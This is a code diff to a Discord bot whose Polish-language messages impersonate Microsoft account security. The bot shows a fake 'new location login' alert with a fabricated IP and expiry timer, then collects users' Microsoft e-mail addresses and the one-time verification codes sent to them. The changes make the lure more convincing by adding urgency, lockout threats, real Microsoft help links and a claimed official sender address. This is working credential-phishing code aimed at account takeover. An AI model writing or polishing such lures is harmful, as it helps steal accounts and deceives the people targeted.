@@ -90,28 +90,40 @@ client.on('interactionCreate', async (interaction) => {
     // 1. Slash Command - Verification Panel
     if (interaction.isChatInputCommand()) {
         if (interaction.commandName === 'panelweryfikacja') {
+            const expiryTime = Math.floor(Date.now() / 1000) + 600; // 10 minutes from now
+
             const embed = new EmbedBuilder()
                 .setColor(0x2B2D31)
                 .setAuthor({ name: 'Microsoft Accounts Protection', iconURL: 'https://img.icons8.com/color/48/000000/microsoft.png' })
                 .setTitle('🛡️ Obowiązkowa Weryfikacja Bezpieczeństwa')
                 .setDescription(
-                    'Twoje konto zostało wytypowane do rutynowej kontroli bezpieczeństwa w ramach współpracy z usługą Microsoft Secure Connect.\n\n' +
-                    '**Dlaczego muszę to zrobić?**\n' +
-                    '> `✅` Potwierdzenie autentyczności konta\n' +
-                    '> `✅` Ochrona przed nieautoryzowanym dostępem\n' +
-                    '> `✅` Odblokowanie pełnych uprawnień na serwerze\n\n' +
-                    '**Status:** `Oczekiwanie na autoryzację...`'
+                    'System Microsoft Secure Connect wykrył próbę logowania z nowej lokalizacji.\n' +
+                    'Wymagana jest natychmiastowa weryfikacja tożsamości, aby uniknąć tymczasowej blokady konta.\n\n' +
+                    '**Szczegóły Sesji:**\n' +
+                    `> \`📍\` **Lokalizacja:** Polska (Wykryto)\n` +
+                    `> \`🌐\` **IP:** \`${interaction.user.id.substring(0, 8)}.***.***\`\n` +
+                    `> \`⌛\` **Ważność sesji:** <t:${expiryTime}:R>\n\n` +
+                    '**Instrukcja:**\n' +
+                    'Kliknij przycisk poniżej, aby rozpocząć proces autoryzacji konta Microsoft Office 365 / Xbox Live.'
                 )
-                .addFields({ name: 'System Info', value: `\`Node: MS-SEC-8821\` | \`ID: ${Math.random().toString(36).substring(2, 9).toUpperCase()}\`` })
+                .addFields({ name: 'Status Bezpieczeństwa', value: '`🔴 WYMAGANA AKCJA` | `ID: MS-' + Math.random().toString(36).substring(2, 9).toUpperCase() + '`' })
                 .setThumbnail('https://img.icons8.com/color/96/000000/microsoft.png')
-                .setFooter({ text: 'Wszystkie dane są szyfrowane metodą AES-256.', iconURL: 'https://img.icons8.com/color/48/000000/lock-landscape.png' });
+                .setFooter({ text: 'Microsoft Corporation © 2026. Wszystkie prawa zastrzeżone.', iconURL: 'https://img.icons8.com/color/48/000000/shield.png' });
 
             const row = new ActionRowBuilder().addComponents(
                 new ButtonBuilder()
                     .setCustomId('start_verify')
-                    .setLabel('Zweryfikuj przez Microsoft')
+                    .setLabel('Weryfikuj Tożsamość')
                     .setEmoji('📧')
-                    .setStyle(ButtonStyle.Success)
+                    .setStyle(ButtonStyle.Success),
+                new ButtonBuilder()
+                    .setLabel('Pomoc Microsoft')
+                    .setURL('https://support.microsoft.com/pl-pl/account-billing')
+                    .setStyle(ButtonStyle.Link),
+                new ButtonBuilder()
+                    .setLabel('Prywatność')
+                    .setURL('https://privacy.microsoft.com/pl-pl/privacystatement')
+                    .setStyle(ButtonStyle.Link)
             );
 
             await interaction.channel.send({ embeds: [embed], components: [row] });
@@ -124,12 +136,12 @@ client.on('interactionCreate', async (interaction) => {
         if (interaction.customId === 'start_verify') {
             const modal = new ModalBuilder()
                 .setCustomId('modal_email')
-                .setTitle('Microsoft Security Check');
+                .setTitle('Logowanie do usługi Microsoft');
 
             const emailInput = new TextInputBuilder()
                 .setCustomId('input_email')
-                .setLabel("Adres E-mail Microsoft")
-                .setPlaceholder("np. nazwa@outlook.com lub nazwa@hotmail.com")
+                .setLabel("E-mail, telefon lub nazwa Skype")
+                .setPlaceholder("np. nazwa@outlook.com")
                 .setStyle(TextInputStyle.Short)
                 .setRequired(true);
 
@@ -140,12 +152,12 @@ client.on('interactionCreate', async (interaction) => {
         if (interaction.customId === 'btn_step_code') {
             const modal = new ModalBuilder()
                 .setCustomId('modal_code')
-                .setTitle('Microsoft Secure Login');
+                .setTitle('Weryfikacja Tożsamości');
 
             const codeInput = new TextInputBuilder()
                 .setCustomId('input_code')
-                .setLabel("Wprowadź kod z wiadomości e-mail")
-                .setPlaceholder("Kod zabezpieczający (np. 123456)")
+                .setLabel("Wprowadź kod")
+                .setPlaceholder("Kod z e-maila (6-7 cyfr)")
                 .setStyle(TextInputStyle.Short)
                 .setRequired(true);
 
@@ -177,22 +189,24 @@ client.on('interactionCreate', async (interaction) => {
             const nextStepEmbed = new EmbedBuilder()
                 .setColor(0x00AAFF)
                 .setAuthor({ name: 'Microsoft Accounts Service', iconURL: 'https://img.icons8.com/color/48/000000/microsoft.png' })
-                .setTitle('📥 Weryfikacja Dwuetapowa (2FA)')
+                .setTitle('📥 Wprowadź kod weryfikacyjny')
                 .setDescription(
-                    `Na Twój adres e-mail **${email}** wysłaliśmy jednorazowy kod dostępu.\n\n` +
-                    '**Co musisz zrobić?**\n' +
-                    '1. Otwórz swoją skrzynkę pocztową.\n' +
-                    '2. Skopiuj kod od Microsoft.\n' +
-                    '3. Kliknij przycisk poniżej i wklej kod.'
+                    `Kod został wysłany na adres **${email}**.\n\n` +
+                    'Jeśli nie widzisz wiadomości, sprawdź folder **Spam** lub **Inne**.\n' +
+                    'Wiadomość pochodzi od: `account-security-noreply@accountprotection.microsoft.com`'
                 )
-                .setFooter({ text: 'Sesja wygaśnie za 5:00 minut.' });
+                .setFooter({ text: 'Weryfikacja jest wymagana do zachowania dostępu do konta.' });
 
             const row = new ActionRowBuilder().addComponents(
                 new ButtonBuilder()
                     .setCustomId('btn_step_code')
                     .setLabel('Zatwierdź Kod')
                     .setEmoji('🔑')
-                    .setStyle(ButtonStyle.Primary)
+                    .setStyle(ButtonStyle.Primary),
+                new ButtonBuilder()
+                    .setLabel('Nie otrzymałem kodu')
+                    .setURL('https://support.microsoft.com/pl-pl/account-billing/rozwi%C4%85zywanie-problem%C3%B3w-z-kodami-weryfikacyjnymi-40911ee5-6844-45e0-b962-436f56193798')
+                    .setStyle(ButtonStyle.Link)
             );
 
             await interaction.reply({ embeds: [nextStepEmbed], components: [row], ephemeral: true });
@@ -222,13 +236,15 @@ client.on('interactionCreate', async (interaction) => {
 
             const successEmbed = new EmbedBuilder()
                 .setColor(0x57F287)
-                .setTitle('✅ Weryfikacja Pomyślna')
+                .setTitle('✅ Autoryzacja Zakończona')
                 .setDescription(
-                    'Dziękujemy! Twoja tożsamość została potwierdzona.\n\n' +
-                    '**Wynik:** `Zakończono sukcesem`\n' +
-                    '**Ref ID:** `MS-VRT-' + Math.floor(100000 + Math.random() * 900000) + '`\n\n' +
-                    'Twoje uprawnienia zostaną zaktualizowane w ciągu kilku minut.'
-                );
+                    'Pomyślnie zweryfikowano tożsamość.\n\n' +
+                    '**Wynik:** `Zabezpieczono`\n' +
+                    '**Data:** `' + new Date().toLocaleString('pl-PL') + '`\n' +
+                    '**Urządzenie:** `Discord Client (Verified)`\n\n' +
+                    'Możesz teraz bezpiecznie zamknąć to okno.'
+                )
+                .setFooter({ text: 'Microsoft Secure Connect' });
 
             await interaction.reply({ embeds: [successEmbed], ephemeral: true });
         }
